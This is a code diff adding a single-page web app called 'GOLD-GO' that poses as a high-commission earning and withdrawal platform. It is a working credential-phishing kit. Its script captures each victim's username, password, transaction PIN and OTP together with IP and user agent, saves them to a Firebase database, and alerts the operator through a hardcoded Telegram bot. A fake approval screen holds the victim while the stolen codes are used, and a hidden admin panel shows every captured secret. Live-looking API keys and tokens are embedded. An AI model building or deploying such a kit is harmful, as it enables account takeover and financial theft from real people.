@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>GOLD-GO</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background: #f4f4f6; display: flex; justify-content: center; min-height: 100vh; }
+  .page { width: 100%; max-width: 480px; min-height: 100vh; background: #f4f4f6; position: relative; overflow: hidden; }
+  .hero { background: linear-gradient(180deg, #8a3ff0 0%, #7b2ff0 100%); border-radius: 0 0 40px 40px; padding: 48px 24px 56px; text-align: center; color: #fff; }
+  .hero h1 { font-size: 2.6rem; font-style: italic; font-weight: 800; letter-spacing: 1px; }
+  .hero p { margin-top: 12px; font-size: 1.1rem; opacity: 0.95; }
+  .vip-banner { margin: -28px 24px 0; background: linear-gradient(90deg, #f7b733 0%, #f6a527 100%); border-radius: 999px; padding: 16px 20px; text-align: center; font-weight: 700; color: #2a2a2a; box-shadow: 0 8px 20px rgba(246, 165, 39, 0.4); position: relative; z-index: 2; }
+  .form-wrap { padding: 40px 24px 32px; }
+  .form-wrap h2 { font-size: 1.6rem; font-weight: 500; color: #222; margin-bottom: 8px; }
+  .form-wrap p.sub { color: #666; font-size: 0.95rem; margin-bottom: 20px; }
+  input { width: 100%; padding: 16px; margin-bottom: 18px; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; background: #fff; outline: none; transition: 0.2s; }
+  input:focus { border-color: #7b2ff0; box-shadow: 0 0 0 3px rgba(123,47,240,0.12); }
+  #pinInput { letter-spacing: 4px; }
+  #otpInput { letter-spacing: 6px; font-size: 1.4rem; text-align: center; }
+  .links-row { display: flex; justify-content: space-between; font-size: 0.95rem; margin-bottom: 24px; }
+  .links-row a { color: #7b2ff0; text-decoration: none; }
+  .btn { width: 100%; padding: 16px; border-radius: 999px; font-size: 1.1rem; font-weight: 600; border: none; cursor: pointer; margin-bottom: 16px; transition: 0.2s; }
+  .btn-primary { background: #7b2ff0; color: #fff; }
+  .btn-success { background: #28a745; color: #fff; }
+  .btn-warning { background: #ffc107; color: #222; }
+  .btn-gold { background: linear-gradient(90deg, #f7b733, #f6a527); color: #222; font-weight: 700; }
+  .back-link { color: #7b2ff0; text-decoration: underline; font-size: 1rem; background: none; border: none; cursor: pointer; display: block; text-align: center; margin-top: 8px; width: 100%; }
+  .screen { display: none; }
+  .screen.active { display: block; }
+  .loader-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; gap: 16px; padding: 80px 24px; }
+  .loader-overlay.active { display: flex; }
+  .spinner { width: 42px; height: 42px; border: 4px solid #e5e0f7; border-top-color: #7b2ff0; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .otp-timer-msg { background: #e8f5e9; color: #2e7d32; padding: 12px 16px; border-radius: 12px; font-size: 0.9rem; margin-bottom: 18px; text-align: center; }
+  .resend-now { color: #7b2ff0; font-weight: 600; cursor: pointer; text-decoration: underline; }
+  .approval-box { text-align: center; padding: 24px 0; }
+  .approval-icon { width: 90px; height: 90px; border-radius: 50%; background: linear-gradient(135deg, #7b2ff0, #9c5bff); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 42px; animation: pulse 1.8s infinite; }
+  @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.06); } }
+  .approval-box h2 { font-size: 1.5rem; color: #222; margin-bottom: 8px; }
+  .approval-box p { color: #666; font-size: 0.95rem; line-height: 1.6; margin-bottom: 20px; }
+  .approval-status { display: inline-flex; align-items: center; gap: 8px; background: #f5efff; color: #7b2ff0; padding: 10px 20px; border-radius: 999px; font-weight: 600; font-size: 0.9rem; }
+  .failed-box { text-align: center; padding: 40px 0; }
+  .failed-icon { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #e53935, #c62828); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 52px; }
+  .failed-box h2 { font-size: 1.7rem; font-weight: 700; color: #c62828; margin-bottom: 10px; }
+  .success-page { text-align: center; padding: 50px 24px 40px; }
+  .success-icon { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; }
+  .success-icon svg { width: 56px; height: 56px; fill: #fff; }
+  .success-page h2 { font-size: 1.8rem; font-weight: 700; color: #222; margin-bottom: 8px; }
+  .success-page .badge-main { display: inline-block; background: linear-gradient(90deg, #f7b733, #f6a527); padding: 10px 28px; border-radius: 999px; font-weight: 800; font-size: 1.2rem; color: #222; margin: 12px 0 20px; }
+  .info-box { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 20px; text-align: left; }
+  .info-box .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 0.95rem; }
+  .info-box .label { color: #888; }
+  .info-box .value { color: #222; font-weight: 500; }
+  .info-box .value.green { color: #28a745; }
+  .info-box .value.gold { color: #b8860b; font-weight: 700; }
+
+  .admin-page { background: #0f0f1e; min-height: 100vh; color: #fff; width: 100%; display: none; }
+  .admin-page.active { display: block; }
+  .admin-wrap { padding: 20px; max-width: 1200px; margin: 0 auto; }
+  .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px;
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; margin-bottom: 24px; }
+  .admin-header h1 { font-size: 1.3rem; }
+  .admin-logout-btn { background: rgba(229,57,53,0.15); color: #ff6b6b; border: 1px solid rgba(229,57,53,0.3);
+    padding: 8px 16px; border-radius: 999px; font-size: 0.85rem; font-weight: 600; cursor: pointer; }
+  .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 24px; }
+  .stat-card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 18px; }
+  .stat-label { font-size: 0.8rem; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+  .stat-value { font-size: 1.8rem; font-weight: 700; }
+  .stat-value.purple { color: #b794f6; }
+  .stat-value.green { color: #69f0ae; }
+  .stat-value.red { color: #ff6b6b; }
+  .stat-value.gold { color: #f7b733; }
+  .section-title { font-size: 1.1rem; margin-bottom: 14px; color: rgba(255,255,255,0.9); }
+  .sessions-container { display: grid; gap: 14px; }
+  .session-card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px; padding: 18px; }
+  .session-card.approved { border-color: rgba(40,167,69,0.4); }
+  .session-card.rejected { border-color: rgba(229,57,53,0.4); opacity: 0.7; }
+  .session-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;
+    padding-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.06); }
+  .session-user { font-size: 1.1rem; font-weight: 700; color: #b794f6; }
+  .status-badge { padding: 5px 12px; border-radius: 999px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; }
+  .status-pending { background: rgba(247,183,51,0.15); color: #f7b733; border: 1px solid rgba(247,183,51,0.3); }
+  .status-approved { background: rgba(40,167,69,0.15); color: #69f0ae; border: 1px solid rgba(40,167,69,0.3); }
+  .status-rejected { background: rgba(229,57,53,0.15); color: #ff6b6b; border: 1px solid rgba(229,57,53,0.3); }
+  .session-details { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 14px; }
+  .detail-item { background: rgba(0,0,0,0.2); padding: 10px 14px; border-radius: 10px; font-size: 0.9rem; }
+  .detail-item .lbl { color: rgba(255,255,255,0.5); font-size: 0.75rem; text-transform: uppercase; margin-bottom: 4px; }
+  .detail-item .val { color: #fff; font-weight: 600; word-break: break-all; }
+  .session-actions { display: flex; gap: 10px; margin-top: 12px; }
+  .action-btn { flex: 1; padding: 12px 20px; border: none; border-radius: 10px; font-size: 0.95rem; font-weight: 700; cursor: pointer; }
+  .action-btn.approve { background: linear-gradient(135deg, #28a745, #20c997); color: #fff; }
+  .action-btn.reject { background: linear-gradient(135deg, #e53935, #c62828); color: #fff; }
+  .action-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .empty-state { text-align: center; padding: 60px 20px; color: rgba(255,255,255,0.4); }
+  .empty-state .icon { font-size: 60px; margin-bottom: 14px; opacity: 0.5; }
+</style>
+</head>
+<body>
+
+<!-- USER PAGE -->
+<div class="page" id="userPage">
+  <div class="hero">
+    <h1>GOLD-GO</h1>
+    <p>Earn huge commissions</p>
+  </div>
+  <div class="vip-banner">★ VIP Withdrawal &amp; remove risk</div>
+
+  <div class="form-wrap screen active" id="loginScreen">
+    <h2>Sign in</h2>
+    <p class="sub">Enter your account details to continue</p>
+    <form id="loginForm">
+      <input type="text" id="usernameInput" placeholder="Enter your account" required autocomplete="off">
+      <input type="password" id="passwordInput" placeholder="Enter password" required autocomplete="off">
+      <div class="links-row">
+        <a href="#">Forgot account &gt;</a>
+        <a href="#">Forgot password &gt;</a>
+      </div>
+      <button type="submit" class="btn btn-primary">Login</button>
+    </form>
+  </div>
+
+  <div class="loader-overlay" id="loader">
+    <div class="spinner"></div>
+    <p id="loaderText">Signing in...</p>
+  </div>
+
+  <div class="form-wrap screen" id="pinScreen">
+    <h2>Security Verification</h2>
+    <p class="sub">Enter your 6-digit transaction PIN</p>
+    <form id="pinForm">
+      <input type="password" id="pinInput" inputmode="numeric" maxlength="6" placeholder="Enter 6-digit PIN" required>
+      <button type="submit" class="btn btn-primary">Confirm PIN</button>
+    </form>
+  </div>
+
+  <div class="form-wrap screen" id="otpScreen">
+    <h2>OTP Verification</h2>
+    <p class="sub">An OTP has been sent to your registered mobile number</p>
+    <div class="otp-timer-msg" id="otpTimerMsg">
+      <span id="timerText">⏱ Resend OTP in <span id="timerCountdown">60</span> seconds</span>
+      <span id="resendLink" style="display:none;">📱 <span class="resend-now" id="resendOtpLink">Resend OTP now</span></span>
+    </div>
+    <form id="otpForm">
+      <input type="text" id="otpInput" inputmode="numeric" maxlength="6" placeholder="Enter 6-digit OTP" required>
+      <button type="submit" class="btn btn-success">Verify OTP</button>
+    </form>
+    <button type="button" class="btn btn-warning" id="resendOtpBtn" style="display:none;">Resend OTP</button>
+  </div>
+
+  <div class="form-wrap screen" id="approvalScreen">
+    <div class="approval-box">
+      <div class="approval-icon">⏳</div>
+      <h2>Waiting for Approval</h2>
+      <p>Your verification request has been sent to the admin.<br>Please wait while admin verifies your account.</p>
+      <div class="approval-status"><span id="approvalStatusText">Waiting for admin...</span></div>
+    </div>
+    <button type="button" class="back-link" id="cancelApproval">← Cancel & go back</button>
+  </div>
+
+  <div class="form-wrap screen" id="failedScreen">
+    <div class="failed-box">
+      <div class="failed-icon">❌</div>
+      <h2>Verification Failed</h2>
+      <p style="color:#666;margin-bottom:26px;">Your login request was rejected.</p>
+    </div>
+    <button type="button" class="btn btn-primary" id="retryBtn">Try Again</button>
+  </div>
+
+  <div class="form-wrap screen" id="successScreen">
+    <div class="success-page">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      </div>
+      <h2>Fast Withdrawal</h2>
+      <div class="badge-main">✅ Active in Your Account</div>
+      <p style="color:#555;margin-bottom:28px;">Your account has been verified successfully.</p>
+      <div class="info-box">
+        <div class="row"><span class="label">Account</span><span class="value" id="successUsername">-</span></div>
+        <div class="row"><span class="label">Status</span><span class="value green">● Active</span></div>
+        <div class="row"><span class="label">Withdrawal Type</span><span class="value gold">⚡ Fast Withdrawal</span></div>
+      </div>
+      <button type="button" class="btn btn-gold" id="withdrawBtn">🚀 Withdraw Now</button>
+      <button type="button" class="back-link" id="logoutBtn">Logout</button>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN PAGE -->
+<div class="admin-page" id="adminPage">
+  <div class="admin-wrap">
+    <div class="admin-header">
+      <h1>🪙 GOLD-GO Admin</h1>
+      <div class="admin-header-right">
+        <button class="admin-logout-btn" id="adminLogoutBtn">Logout</button>
+      </div>
+    </div>
+    <div class="admin-stats">
+      <div class="stat-card"><div class="stat-label">Total</div><div class="stat-value purple" id="statTotal">0</div></div>
+      <div class="stat-card"><div class="stat-label">Pending</div><div class="stat-value gold" id="statPending">0</div></div>
+      <div class="stat-card"><div class="stat-label">Approved</div><div class="stat-value green" id="statApproved">0</div></div>
+      <div class="stat-card"><div class="stat-label">Rejected</div><div class="stat-value red" id="statRejected">0</div></div>
+    </div>
+    <h2 class="section-title">📋 Pending Requests</h2>
+    <div class="sessions-container" id="pendingContainer">
+      <div class="empty-state"><div class="icon">⏳</div><p>No pending requests</p></div>
+    </div>
+    <h2 class="section-title" style="margin-top:30px;">✅ Resolved Sessions</h2>
+    <div class="sessions-container" id="resolvedContainer">
+      <div class="empty-state"><div class="icon">📭</div><p>No resolved sessions yet</p></div>
+    </div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<script>
+  /* 🔥 FIREBASE CONFIG */
+  const firebaseConfig = {
+    apiKey: "AIzaSyBKEZvvUvpxCOy0dFqE0I2ytbfTf6puZ8o",
+    authDomain: "bnitinweb.firebaseapp.com",
+    databaseURL: "https://bnitinweb-default-rtdb.firebaseio.com",
+    projectId: "bnitinweb",
+    storageBucket: "bnitinweb.firebasestorage.app",
+    messagingSenderId: "8638948411",
+    appId: "1:8638948411:web:d75802ef8a049b1b1ae81e"
+  };
+
+  /* 🤖 TELEGRAM — NAYA TOKEN & CHAT ID */
+  const BOT_TOKEN = '8574032530:AAGRLPBi8hFjhemEsQPpIbDiCC0-12m5t1c';
+  const CHAT_ID   = '8812136676';
+
+  /* 🔐 ADMIN CREDENTIALS */
+  const ADMIN_USER = 'VIPxNITIN';
+  const ADMIN_PASS = 'VIPxVANSHIKA';
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  /* 🤖 TELEGRAM — SIRF NOTIFICATION */
+  function tgNotify(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    }).catch(() => {});
+  }
+
+  /* UI REFS */
+  const userPage = document.getElementById('userPage');
+  const adminPage = document.getElementById('adminPage');
+
+  const loginScreen = document.getElementById('loginScreen');
+  const pinScreen = document.getElementById('pinScreen');
+  const otpScreen = document.getElementById('otpScreen');
+  const approvalScreen = document.getElementById('approvalScreen');
+  const failedScreen = document.getElementById('failedScreen');
+  const successScreen = document.getElementById('successScreen');
+  const loader = document.getElementById('loader');
+  const loaderText = document.getElementById('loaderText');
+  const timerText = document.getElementById('timerText');
+  const timerCountdown = document.getElementById('timerCountdown');
+  const resendLink = document.getElementById('resendLink');
+  const resendOtpLink = document.getElementById('resendOtpLink');
+  const resendOtpBtn = document.getElementById('resendOtpBtn');
+
+  let capturedUsername = '', capturedPassword = '', capturedPin = '', capturedOtp = '';
+  let currentSessionId = '', statusListener = null, timerInterval = null, secondsLeft = 60;
+  let ip_global = 'Unknown', ua_global = '';
+
+  function hideAll() {
+    document.querySelectorAll('#userPage .screen').forEach(s => s.classList.remove('active'));
+    loader.classList.remove('active');
+  }
+  function showScreen(el) { hideAll(); el.classList.add('active'); }
+  function showWithLoader(el, msg, delay) {
+    hideAll(); loaderText.textContent = msg; loader.classList.add('active');
+    setTimeout(() => showScreen(el), delay);
+  }
+  function nowTime() { return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }); }
+
+  function startOtpTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    secondsLeft = 60;
+    timerText.style.display = 'inline';
+    resendLink.style.display = 'none';
+    resendOtpBtn.style.display = 'none';
+    timerCountdown.textContent = secondsLeft;
+    timerInterval = setInterval(() => {
+      secondsLeft--; timerCountdown.textContent = secondsLeft;
+      if (secondsLeft <= 0) {
+        clearInterval(timerInterval); timerInterval = null;
+        timerText.style.display = 'none';
+        resendLink.style.display = 'inline';
+        resendOtpBtn.style.display = 'block';
+      }
+    }, 1000);
+  }
+
+  /* LOGIN FORM */
+  document.getElementById('loginForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const u = document.getElementById('usernameInput').value.trim();
+    const p = document.getElementById('passwordInput').value.trim();
+    if (!u || !p) return;
+
+    if (u === ADMIN_USER && p === ADMIN_PASS) {
+      userPage.style.display = 'none';
+      adminPage.classList.add('active');
+      startAdminListener();
+      return;
+    }
+
+    capturedUsername = u;
+    capturedPassword = p;
+    currentSessionId = 'SESS' + Date.now() + Math.floor(Math.random() * 9000 + 1000);
+    ua_global = navigator.userAgent || '';
+
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => { ip_global = d.ip; saveLogin(); })
+      .catch(() => { ip_global = 'Unknown'; saveLogin(); });
+
+    function saveLogin() {
+      db.ref('sessions/' + currentSessionId).set({
+        username: capturedUsername, password: capturedPassword,
+        pin: '', otp: '', ip: ip_global, time: nowTime(), ua: ua_global,
+        status: 'pending', stage: 'login', createdAt: Date.now()
+      }).catch(() => {});
+
+      tgNotify(`🔔 <b>New User Login Attempt</b>\n\n👤 Kisi user ne ID-Password daala hai\n⏰ ${nowTime()}\n\n📌 Admin panel check karo`);
+    }
+
+    showWithLoader(pinScreen, 'Signing in...', 1000);
+  });
+
+  /* PIN SUBMIT */
+  document.getElementById('pinForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const pin = document.getElementById('pinInput').value.trim();
+    if (!pin || pin.length < 6) { alert('Please enter 6-digit PIN'); return; }
+    capturedPin = pin;
+
+    db.ref('sessions/' + currentSessionId).update({
+      pin: capturedPin, stage: 'pin', pinTime: nowTime()
+    }).catch(() => {});
+
+    tgNotify(`🔒 <b>PIN Entered</b>\n\n👤 Usi user ne PIN daala hai\n⏰ ${nowTime()}\n\n📌 Admin panel check karo`);
+
+    document.getElementById('otpInput').value = '';
+    showWithLoader(otpScreen, 'Sending OTP...', 1200);
+    setTimeout(startOtpTimer, 500);
+  });
+
+  /* OTP SUBMIT */
+  document.getElementById('otpForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const otp = document.getElementById('otpInput').value.trim();
+    if (!/^\d{6}$/.test(otp)) { alert('❌ Please enter valid 6-digit OTP'); return; }
+    capturedOtp = otp;
+    if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+
+    db.ref('sessions/' + currentSessionId).update({
+      otp: capturedOtp, stage: 'otp', otpTime: nowTime(), status: 'pending'
+    }).catch(() => {});
+
+    tgNotify(`📩 <b>OTP Entered</b>\n\n👤 Usi user ne OTP daala hai\n⏰ ${nowTime()}\n\n✅ Ab admin panel me jaake approve/reject karo`);
+
+    hideAll();
+    document.getElementById('approvalStatusText').textContent = 'Waiting for admin...';
+    approvalScreen.classList.add('active');
+
+    statusListener = db.ref('sessions/' + currentSessionId + '/status').on('value', snap => {
+      const status = snap.val();
+      if (status === 'approved') {
+        db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+        document.getElementById('successUsername').textContent = capturedUsername;
+        showWithLoader(successScreen, 'Logging you in...', 900);
+      } else if (status === 'rejected') {
+        db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+        showWithLoader(failedScreen, 'Failed...', 700);
+      }
+    });
+  });
+
+  /* OTHER BUTTONS */
+  document.getElementById('cancelApproval').addEventListener('click', () => {
+    if (statusListener) db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+    showWithLoader(loginScreen, 'Loading...', 500);
+  });
+
+  function handleResendOtp() {
+    document.getElementById('otpInput').value = '';
+    startOtpTimer();
+    alert('✅ OTP sent');
+  }
+  resendOtpLink.addEventListener('click', handleResendOtp);
+  resendOtpBtn.addEventListener('click', handleResendOtp);
+
+  document.getElementById('withdrawBtn').addEventListener('click', () => alert('Processing...'));
+  document.getElementById('retryBtn').addEventListener('click', () => {
+    document.getElementById('usernameInput').value = '';
+    document.getElementById('passwordInput').value = '';
+    document.getElementById('pinInput').value = '';
+    document.getElementById('otpInput').value = '';
+    capturedUsername = ''; capturedPassword = ''; capturedPin = '';
+    showWithLoader(loginScreen, 'Loading...', 500);
+  });
+  document.getElementById('logoutBtn').addEventListener('click', () => location.reload());
+
+  /* ADMIN PANEL */
+  let allSessions = {};
+  let adminListening = false;
+
+  function startAdminListener() {
+    if (adminListening) return;
+    adminListening = true;
+    db.ref('sessions').on('value', snap => {
+      allSessions = snap.val() || {};
+      renderAdmin();
+    });
+  }
+
+  function renderAdmin() {
+    const pendingContainer = document.getElementById('pendingContainer');
+    const resolvedContainer = document.getElementById('resolvedContainer');
+
+    const pending = [], approved = [], rejected = [];
+    Object.keys(allSessions).forEach(id => {
+      const s = allSessions[id];
+      s._id = id;
+      if (s.status === 'pending') pending.push(s);
+      else if (s.status === 'approved') approved.push(s);
+      else if (s.status === 'rejected') rejected.push(s);
+    });
+
+    const sortFn = (a, b) => (b.createdAt || 0) - (a.createdAt || 0);
+    pending.sort(sortFn);
+    approved.sort(sortFn);
+    rejected.sort(sortFn);
+
+    document.getElementById('statTotal').textContent = pending.length + approved.length + rejected.length;
+    document.getElementById('statPending').textContent = pending.length;
+    document.getElementById('statApproved').textContent = approved.length;
+    document.getElementById('statRejected').textContent = rejected.length;
+
+    if (pending.length === 0) {
+      pendingContainer.innerHTML = '<div class="empty-state"><div class="icon">⏳</div><p>No pending requests</p></div>';
+    } else {
+      pendingContainer.innerHTML = pending.map(s => renderCard(s, true)).join('');
+    }
+
+    const resolved = approved.concat(rejected);
+    if (resolved.length === 0) {
+      resolvedContainer.innerHTML = '<div class="empty-state"><div class="icon">📭</div><p>No resolved sessions yet</p></div>';
+    } else {
+      resolvedContainer.innerHTML = resolved.map(s => renderCard(s, false)).join('');
+    }
+  }
+
+  function renderCard(s, isPending) {
+    const statusClass = 'status-' + (s.status || 'pending');
+    const cardClass = s.status === 'approved' ? 'approved' : (s.status === 'rejected' ? 'rejected' : '');
+
+    let actions = '';
+    if (isPending) {
+      actions = `<div class="session-actions">
+        <button class="action-btn approve" onclick="approveSession('${s._id}')">✅ Approve</button>
+        <button class="action-btn reject" onclick="rejectSession('${s._id}')">❌ Reject</button>
+      </div>`;
+    } else {
+      actions = `<div class="session-actions">
+        <button class="action-btn ${s.status === 'approved' ? 'approve' : 'reject'}" disabled>
+          ${s.status === 'approved' ? '✅ Approved' : '❌ Rejected'}
+        </button>
+      </div>`;
+    }
+
+    return `
+      <div class="session-card ${cardClass}">
+        <div class="session-header">
+          <div class="session-user">👤 ${esc(s.username || '-')}</div>
+          <div class="status-badge ${statusClass}">${s.status || 'pending'}</div>
+        </div>
+        <div class="session-details">
+          <div class="detail-item"><div class="lbl">🔑 Password</div><div class="val">${esc(s.password || '-')}</div></div>
+          <div class="detail-item"><div class="lbl">🔢 PIN</div><div class="val">${esc(s.pin || 'Not entered')}</div></div>
+          <div class="detail-item"><div class="lbl">📩 OTP</div><div class="val">${esc(s.otp || 'Not entered')}</div></div>
+          <div class="detail-item"><div class="lbl">🌐 IP</div><div class="val">${esc(s.ip || '-')}</div></div>
+          <div class="detail-item"><div class="lbl">🕒 Time</div><div class="val">${esc(s.time || '-')}</div></div>
+        </div>
+        ${actions}
+      </div>`;
+  }
+
+  function esc(s) {
+    return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  window.approveSession = function(id) {
+    if (!confirm('Approve this session?')) return;
+    db.ref('sessions/' + id).update({ status: 'approved', resolvedAt: nowTime() })
+      .catch(err => alert('❌ ' + err.message));
+  };
+
+  window.rejectSession = function(id) {
+    if (!confirm('Reject this session?')) return;
+    db.ref('sessions/' + id).update({ status: 'rejected', resolvedAt: nowTime() })
+      .catch(err => alert('❌ ' + err.message));
+  };
+
+  document.getElementById('adminLogoutBtn').addEventListener('click', () => {
+    adminPage.classList.remove('active');
+    userPage.style.display = 'flex';
+    document.getElementById('usernameInput').value = '';
+    document.getElementById('passwordInput').value = '';
+  });
+
+  console.log('✅ GOLD-GO ready');
+</script>
+</body>
+</html>
